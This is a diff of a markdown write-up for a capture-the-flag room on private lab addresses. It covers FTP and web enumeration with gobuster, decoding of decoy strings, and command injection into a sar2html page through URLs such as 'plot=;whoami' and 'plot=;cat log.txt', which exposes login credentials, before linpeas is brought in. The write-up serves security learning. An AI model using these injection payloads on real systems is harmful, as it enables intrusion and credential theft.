@@ -67,6 +67,7 @@ As we can see from the above scan results, this machine has an FTP server that a
 
 My initial plan of attack is to enumerate the FTP server and see if there's anything interesting inside. Afterwards, I'll investigate the web server on port 80. If that fails, I'll search for exploits for MiniServ 1.930
 
+ * * *
 
 ## FTP Server
 
@@ -101,12 +102,13 @@ wget https://raw.githubusercontent.com/balloan/SimpleCiphers/main/SimpleCiphers.
 
 Well, that wasn't helpful in any way, but at least we found it. Let's move on to the web server.
 
+* * *
 
 ## Web Server
 
-I opened the IP address in my web browser.  http://10.10.49.154/
+I opened the IP address in my web browser.  `http://10.10.49.154/`
 
-It was just the default Apache2 web page. The Nmap scan previously showed that robots.txt was a disallowed entry - let's check it.
+It was just the default Apache2 web page. The Nmap scan previously showed that `robots.txt` was a disallowed entry - let's check it.
 
 ```
 http://10.10.49.154/robots.txt
@@ -128,7 +130,7 @@ Disallow: /
 
 ```
 
-Interesting. We can't access any of these directories though. What about the string? Let's write a quick python script to decode it.
+Interesting. We can't access any of these directories though - they don't seem to exist. What about the string? I'll write a quick python script to decode it.
 
 ```
 a = '079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075'
@@ -151,7 +153,7 @@ base64 -d string.txt
 ```
 
 It took awhile for me to recognize it, but this was actually an MD5 hash
-99b0660cd95adea327c54182baa51584 -> kidding
+`99b0660cd95adea327c54182baa51584` -> `kidding`
 
 ...  This also was not very helpful. Let's move on.
 
@@ -159,7 +161,7 @@ It took awhile for me to recognize it, but this was actually an MD5 hash
 
 ## GoBuster
 
-Time for directory busting; let's see if we can find any useful parts of the website to enumerate.
+Time for directory busting; let's see if I can find any useful parts of the website to enumerate.
 
 ```
 gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 
@@ -172,9 +174,9 @@ gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.
 
 ```
 
-Joomla is a content management system. When we navigate to http://10.10.49.154/joomla/ we can see that the website looks relatively default - it has a changed title, the rest looks like a default installation.
+Joomla is a content management system. When we navigate to `http://10.10.49.154/joomla/` we can see that the website looks relatively default - it has a changed title, the rest looks like a default installation.
 
-There isn't really much on the home page; there's a login form but we don't have credentials. I tried basic ones such as "admin:admin". 
+There isn't really much on the home page; there's a login form but we don't have credentials. I tried basic ones such as `admin:admin`. 
 
 Joomla doesn't appear to have default credentials, as you set a password during configuration. I could theoretically try bruteforcing this, but I'll enumerate farther first.
 
@@ -207,15 +209,16 @@ gobuster dir -u $IP/joomla -w /usr/share/wordlists/dirbuster/directory-list-2.3-
 
 Lots of results; let's break this down.
 
-http://10.10.87.42/joomla/installation/ - PLEASE REMEMBER TO COMPLETELY REMOVE THE INSTALLATION FOLDER.
+`http://10.10.87.42/joomla/installation/` 
+PLEASE REMEMBER TO COMPLETELY REMOVE THE INSTALLATION FOLDER.
 You will not be able to proceed beyond this point until the "installation" folder has been removed. This is a security feature of Joomla!
 
-We like security features. The installation folder has not been removed - we'll dig into this later if we find nothing.
+We like security features. The installation folder has not been removed - I'll dig into this later if I find nothing.
 
-http://10.10.87.42/joomla/administrator/  -> Admin login page -> If we find credentials somewhere, this looks promising.
+`http://10.10.87.42/joomla/administrator/`  
+Admin login page -> If I find credentials somewhere, this looks promising.
 
-http://10.10.87.42/joomla/build/jenkins/ - unit-tests.sh & docker-compose.yml -> Credentials for MySQL / postgres?
-We can't use these credentials anywhere, and there's a chance this is default for a Joomla deployment - maybe if there's an internal database service later on this could be helpful.
+`http://10.10.87.42/joomla/build/jenkins/` contains `unit-tests.sh` & `docker-compose.yml` 
 
 ```
 cat unit-tests.sh
@@ -232,16 +235,18 @@ environment:
 
 ```
 
-http://10.10.87.42/joomla/_files/
+We can't use these credentials anywhere, and there's a chance this is default for a Joomla deployment - maybe if there's an internal database service later on this could be helpful.
 
-This page just contained the string: 'VjJodmNITnBaU0JrWVdsemVRbz0K' with the title "Woops"
+`http://10.10.87.42/joomla/_files/`
+
+This page just contained the string: `VjJodmNITnBaU0JrWVdsemVRbz0K` with the title "Woops"
 
 It was double encoded with Base64 - I used CyberChef to decode it. The decoded value was "Whopsie daisy"
 This room creator clearly likes leaving rabbit holes everywhere.
 
 * * *
 
-Time for another GoBuster scan, this time checking everything under /joomla/index.php
+Time for another GoBuster scan, this time checking everything under `/joomla/index.php`
 
 ```
 gobuster dir -u http://10.10.161.218/joomla/index.php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 
@@ -262,7 +267,7 @@ gobuster dir -u http://10.10.161.218/joomla/index.php -w /usr/share/wordlists/di
 
 Nothing at all interesting in these.
 
-I'm going to try enumerating the joomla subdirectories again, with a different wordlists + extensions, as I haven't found a clear direction to attack yet.
+I'm going to try enumerating the Joomla subdirectories again, with a different wordlists + extensions, as I haven't found a clear direction to attack yet.
 The joomla portion seemed the most promising overall so far, and also had rabbit holes like `_files`
 
 ```
@@ -355,9 +360,9 @@ gobuster dir -u $IP/joomla -w /usr/share/wordlists/dirb/common.txt -t 128 -x php
 
 That wordlist got me substantially more information.
 
-http://10.10.86.86/joomla/_archive/ -> Page just said "Mnope, nothin to see."
+`http://10.10.86.86/joomla/_archive/` -> Page just said "Mnope, nothin to see."
 
-http://10.10.86.86/joomla/_database/
+`http://10.10.86.86/joomla/_database/`
 
 Lwuv oguukpi ctqwpf.
 I just used my script with various shift keys because it looked like a shift cipher again. Nothing helpful, again.
@@ -367,23 +372,24 @@ python3 SimpleCiphers.py -c caesar -m d -k 24 "Lwuv oguukpi ctqwpf."
 Just messing around.
 ```
 
-http://10.10.86.86/joomla/_test/ _> This actually looks very interesting - sar2html
+`http://10.10.86.86/joomla/_test/` -> This actually looks very interesting - `sar2html`
 
-When I googled it, I located the following exploit:  https://www.exploit-db.com/exploits/47204
+When I Googled it, I located the following exploit:  `https://www.exploit-db.com/exploits/47204`
 We like to see RCE, and it seems easy enough to abuse.
 
-In order to exploit this, it seems like we can just add commands in the URL, ie "http://10.10.86.86/joomla/_test/index.php?plot=;whoami"
+In order to exploit this, it seems like we can just add commands in the URL, ie `http://10.10.86.86/joomla/_test/index.php?plot=;whoami`
 
 Under the select host section we see `www-data` -> Confirmed Vulnerable.
 
 There are quite a few directories above that I didn't investigate - I'll head back to them later if this exploit doesn't achieve my goals.
 
+* * *
 
 # sar2html
 
 Let's begin enumerating using this exploit.
 
-http://10.10.86.86/joomla/_test/index.php?plot=;ls
+`http://10.10.86.86/joomla/_test/index.php?plot=;ls`
 
 ![sar2html](../assets/images/boilerctf/2.png)
 
@@ -395,6 +401,8 @@ http://10.10.59.164/joomla/_test/index.php?plot=;cat%20log.txt
 ```
 
 Credentials: `basterd:superduperp@$$`
+
+* * *
 
 # Initial Access
 
@@ -485,9 +493,11 @@ ls: cannot access '/NotThisTime/': No such file or directory
 
 I figured I'd double check that it didn't actually exist, considering that the creator seems to like being tricky. Nothing immediately stood out as a privesc vector.
 
+* * *
+
 # Privilege Escalation
 
-I'm going to transfer over Linpeas.sh to the target box to automate the process of looking for privilege escalation vectors.
+I'm going to transfer over `Linpeas.sh` to the target box to automate the process of looking for privilege escalation vectors.
 
 ```
 #Attacker machine
@@ -505,8 +515,6 @@ chmod +x linpeas.sh
 I included the most interesting parts from Linpeas!
 
 ![linpeas](../assets/images/boilerctf/4.png)
-
-![linpeas](../assets/images/boilerctf/5.png)
 
 ![linpeas](../assets/images/boilerctf/6.png)
 
@@ -531,6 +539,8 @@ It wasn't that hard, was it?
 ![Room Complete!](../assets/images/boilerctf/9.png)
 
 Room complete!
+
+* * *
 
 # Takeaways
 
